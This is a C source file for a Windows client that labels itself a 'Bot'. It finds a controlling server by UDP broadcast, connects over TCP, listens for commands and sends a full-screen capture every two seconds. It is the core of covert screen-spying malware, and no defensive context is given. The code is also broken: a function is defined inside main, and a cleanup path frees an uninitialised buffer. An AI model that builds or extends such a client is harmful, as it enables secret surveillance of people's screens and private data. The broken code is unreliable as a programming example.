#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define DISCOVERY_PORT 9999
#define SERVER_PORT 8888
#define DISCOVERY_MSG "SERVER_DISCOVERY_REQUEST"
#define RESPONSE_MSG "SERVER_DISCOVERY_RESPONSE"
#include <windows.h>

int main() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char *message = "Hello from Bot!";

    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
        printf("Failed. Error Code : %d\n",WSAGetLastError());
        return 1;
    }

    // UDP discovery
    SOCKET udp_sock;
    struct sockaddr_in udp_broadcast, udp_recv;
    char recvbuf_udp[1024];
    int udp_recvlen;
    int server_found = 0;
    char server_ip[INET_ADDRSTRLEN] = {0};

    if ((udp_sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        printf("Could not create UDP socket: %d\n", WSAGetLastError());
        return 1;
    }
    BOOL bcast = TRUE;
    setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, (char*)&bcast, sizeof(bcast));
    udp_broadcast.sin_family = AF_INET;
    udp_broadcast.sin_port = htons(DISCOVERY_PORT);
    udp_broadcast.sin_addr.s_addr = INADDR_BROADCAST;

    // Send discovery message
    sendto(udp_sock, DISCOVERY_MSG, strlen(DISCOVERY_MSG), 0, (struct sockaddr*)&udp_broadcast, sizeof(udp_broadcast));

    // Set timeout for response
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    setsockopt(udp_sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
    int udp_recvlen_size = sizeof(udp_recv);
    if ((udp_recvlen = recvfrom(udp_sock, recvbuf_udp, sizeof(recvbuf_udp)-1, 0, (struct sockaddr*)&udp_recv, &udp_recvlen_size)) > 0) {
        recvbuf_udp[udp_recvlen] = '\0';
        if (strcmp(recvbuf_udp, RESPONSE_MSG) == 0) {
            strcpy(server_ip, inet_ntoa(udp_recv.sin_addr));
            server_found = 1;
        }
    }
    closesocket(udp_sock);
    if (!server_found) {
        printf("Server not found on network.\n");
        WSACleanup();
        return 1;
    }
    printf("Discovered server at: %s\n", server_ip);

    // TCP connect as before, but use discovered IP
    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
        printf("Could not create socket : %d\n" , WSAGetLastError());
        return 1;
    }
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0) {
        printf("connect error\n");
        return 1;
    }

    send(s , message , strlen(message) , 0);

    int send_screen_bmp(SOCKET s) {
        int result = -1;
        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);
        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = bmp.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;
        int bmpSize = ((bmp.bmWidth * 3 + 3) & (~3)) * bmp.bmHeight;
        unsigned char* bmpData = (unsigned char*)malloc(bmpSize);
        if (!bmpData) goto cleanup;
        GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, bmpData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        bmfHeader.bfType = 0x4D42;
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        int totalSize = bmfHeader.bfSize;
        char* sendBuf = (char*)malloc(totalSize);
        if (!sendBuf) goto cleanup;
        memcpy(sendBuf, &bmfHeader, sizeof(BITMAPFILEHEADER));
        memcpy(sendBuf + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
        memcpy(sendBuf + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bmpData, bmpSize);
        // Send 4-byte length prefix
        int len = totalSize;
        int sent = send(s, (char*)&len, 4, 0);
        if (sent != 4) goto cleanup;
        int offset = 0;
        while (offset < totalSize) {
            int chunk = send(s, sendBuf + offset, totalSize - offset, 0);
            if (chunk <= 0) goto cleanup;
            offset += chunk;
        }
        result = 0;
    cleanup:
        if (bmpData) free(bmpData);
        if (sendBuf) free(sendBuf);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        return result;
    }
    // Command listening loop
    char recvbuf[1024];
    int recvlen;
    DWORD lastSend = GetTickCount();
    while ((recvlen = recv(s, recvbuf, sizeof(recvbuf)-1, 0)) > 0) {
        recvbuf[recvlen] = '\0';
        if (strcmp(recvbuf, "TURN OFF") == 0) {
            break;
        }
        // Optionally handle other commands here
        // Periodically send screen
        DWORD now = GetTickCount();
        if (now - lastSend > 2000) { // every 2 seconds
            send_screen_bmp(s);
            lastSend = now;
        }
    }

    closesocket(s);
    WSACleanup();
    return 0;
}